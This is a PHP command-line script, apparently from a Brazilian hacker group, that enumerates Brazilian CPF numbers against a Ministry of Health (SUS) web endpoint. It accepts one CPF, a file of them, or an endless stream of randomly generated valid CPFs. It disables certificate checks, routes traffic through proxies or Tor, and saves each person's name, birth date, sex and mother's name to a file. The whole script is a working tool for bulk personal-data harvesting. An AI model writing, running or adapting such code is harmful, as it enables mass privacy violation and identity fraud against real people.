#!/usr/bin/php
<?php
################################################################################
#GRUPO GOOGLEINURL BRASIL - PESQUISA AVANÇADA.
#SCRIPT NAME: Sending SUS Tr3v0r inurlBR 
#AUTOR: Cleiton Pinheiro & Matheus Barbosa 
#Blog: http://blog.inurl.com.br 
#twitter: /@MatheusTDashh & /@googleinurl 
#facebook profile: /Tr1xD00R & /Googleinurl
#facebook page: /OperationOFFensive & /InurlBrasil
#Versão: 1.0
#-------------------------------------------------------------------------------
#PHP Version         5.4.7
#php5-curl           LIB
#php5-cli            LIB  
#cURL support        enabled
#cURL Information    7.24.0
#Apache              2.4
#allow_url_fopen     On
#permission          Reading
#Operating system    LINUX              
################################################################################
error_reporting(0);
set_time_limit(0);
ini_set('display_errors', 0);
!isset($_SESSION) ? session_start() : NULL;
$_SESSION['config']['cont'] = 0;
$opcoes = (PHP_SAPI === 'cli') ? getopt('o:s:h', ['cpf:', 'proxy:', 'random::']) : banner("EXECUTE NO TERMINAL LINUX");
(!extension_loaded("curl") ? banner("\033[1;37m0x\033[0m\033[02;31mINSTALE A LIB php5-curl ex: php5-curl / apt-get install php5-curl\033[0m\n") : NULL );
if (!isset($opcoes['o']) && empty($opcoes['o'])) {
    (!isset($opcoes['cpf']) && empty($opcoes['cpf']) && !isset($opcoes['random'])) ? banner("DEFINA OPÇÃO --cpf ou --random") : NULL;
    isset($opcoes['s']) && !empty($opcoes['s']) ? NULL : banner("DEFINA ARQUIVO OUTPUT");
}
isset($opcoes['h']) ? banner("AJUDA!") : NULL;

function randomcpf($compontos) {
    $n1 = rand(0, 9);
    $n2 = rand(0, 9);
    $n3 = rand(0, 9);
    $n4 = rand(0, 9);
    $n5 = rand(0, 9);
    $n6 = rand(0, 9);
    $n7 = rand(0, 9);
    $n8 = rand(0, 9);
    $n9 = rand(0, 9);
    $d1 = $n9 * 2 + $n8 * 3 + $n7 * 4 + $n6 * 5 + $n5 * 6 + $n4 * 7 + $n3 * 8 + $n2 * 9 + $n1 * 10;
    $d1 = 11 - ( mod($d1, 11) );
    if ($d1 >= 10) {
        $d1 = 0;
    }
    $d2 = $d1 * 2 + $n9 * 3 + $n8 * 4 + $n7 * 5 + $n6 * 6 + $n5 * 7 + $n4 * 8 + $n3 * 9 + $n2 * 10 + $n1 * 11;
    $d2 = 11 - ( mod($d2, 11) );
    if ($d2 >= 10) {
        $d2 = 0;
    }
    $retorno = '';
    if ($compontos == 1) {
        $retorno = '' . $n1 . $n2 . $n3 . "." . $n4 . $n5 . $n6 . "." . $n7 . $n8 . $n9 . "-" . $d1 . $d2;
    } else {
        $retorno = '' . $n1 . $n2 . $n3 . $n4 . $n5 . $n6 . $n7 . $n8 . $n9 . $d1 . $d2;
    }
    return $retorno;
}

function abrirArquivotxt($arquivo, $opcoes) {
    if (isset($arquivo) && !empty($arquivo)) {
        $ponteiro = fopen($arquivo, "r");
        while (!feof($ponteiro)) {

            $cpf = str_replace('-', '', str_replace('.', '', (!is_null(fgets($ponteiro, 4096))) ? str_replace("\n", '', str_replace("\r", '', fgets($ponteiro, 4096))) : NULL));

            pesquisa(isset($cpf) && !empty($cpf) ? $cpf : NULL, $opcoes);
        }

        fclose($ponteiro);
    } else {

        banner(" ALGO DE ERRO NA OPÇÃO ARQUIVO ");
    }
}

function getHttpResponseCode($cpf, $opcoes) {
    $url = "http://dabsistemas.saude.gov.br/sistemas/sadab/js/buscar_cpf_dbpessoa.json.php?cpf={$cpf}";
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, ($url));
    (isset($opcoes['proxy']) && !empty($opcoes['proxy']) ? curl_setopt($curl, CURLOPT_PROXY, $opcoes['proxy']) : NULL);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    return json_decode(curl_exec($curl), TRUE);
}

function mod($dividendo, $divisor) {
    return round($dividendo - (floor($dividendo / $divisor) * $divisor));
}

function pesquisa($cpf, $opcoes) {

    $saida = getHttpResponseCode($cpf, $opcoes);
    if (strlen($saida['NU_CPF']) > 10) {

        echo "\033[32mCPF:\033[0m (\033[1;37m{$_SESSION['config']['cont']}\033[0m) - {$saida['NU_CPF']} \033[32mNOME:\033[0m {$saida['NO_PESSOA_FISICA']} \033[32mNASCIMENTO:\033[0m {$saida['NASCIMENTO']} \033[32mSEXO:\033[0m {$saida['CO_SEXO']} \033[32mMAE:\033[0m {$saida['NO_MAE']} \n";
        file_put_contents($opcoes['s'], "{$saida['NU_CPF']}:{$saida['NO_PESSOA_FISICA']}:{$saida['NASCIMENTO']}:{$saida['CO_SEXO']}:{$saida['NO_MAE']}\r\n", FILE_APPEND);
        $_SESSION['config']['cont'] ++;
    }
}

function banner($msg, $op = NULL) {
    system("command clear");
    print_r("
\n\033[1;37m _____
\033[1;37m(_____)  
\033[1;37m(\033[02;31m() ()\033[1;37m)
\033[1;37m \   /  
\033[1;37m  \ /
\033[1;37m  /=\
\033[1;37m [___] / Googleinurl - [ Sending SUS Tr3v0r inurlBR  ]  
\033[1;37m0xNeither war between hackers, nor peace for the system.
\033[1;37m0x\033[0m\033[02;31mhttp://blog.inurl.com.br
\033[1;37m0x\033[0m\033[02;31mhttps://fb.com/OperationOFFensive & /InurlBrasil
\033[1;37m0x\033[0m\033[02;31mhttp://twitter.com/@MatheusTDashh & @googleinurl\033[0m

\033[1;37m[x]\033[0m\033[02;31mPesquisa cpf único=>     php sus.php --cpf 13326724691 -s resultado.txt
\033[1;37m[x]\033[0m\033[02;31mPesquisa cpf randômico=> php sus.php --random -s resultado.txt
\033[1;37m[x]\033[0m\033[02;31mPesquisa cpf arquivo=>   php sus.php -o arquivo_cpf.txt -s resultado.txt
\033[1;37m[x]\033[0m\033[02;31mPesquisa com proxy=>     php sus.php --cpf 13326724691 -s resultado.txt --proxy proxy:porta
                            php sus.php --cpf --random -s resultado.txt --proxy proxy:porta
                            php sus.php -o arquivo_cpf.txt -s resultado.txt --proxy proxy:porta
\033[1;37m[x]\033[0m\033[02;31mFormato proxy:
--proxy localhost:8118
--proxy socks5://googleinurl@localhost:9050
--proxy http://admin:12334@172.16.0.90:8080
\n\033[1;37m{$msg}\033[0m\n");
    (is_null($op)) ? exit() : NULL;
}

banner("0xCARREGANDO...", TRUE);
if (isset($opcoes['o']) && !empty($opcoes['o'])) {
    abrirArquivotxt($opcoes['o'], $opcoes);
} else {
    while (true) {
        $cpf = str_replace('-', '', str_replace('.', '', (isset($opcoes['random'])) ? randomcpf(intval(rand() % 255)) : $opcoes['cpf']));

        pesquisa(isset($cpf) && !empty($cpf) ? $cpf : banner("DEFINA CPF!"), $opcoes);
        isset($opcoes['random']) ? NULL : banner("[ FIM DO PROCESSO! ]");
    }
}
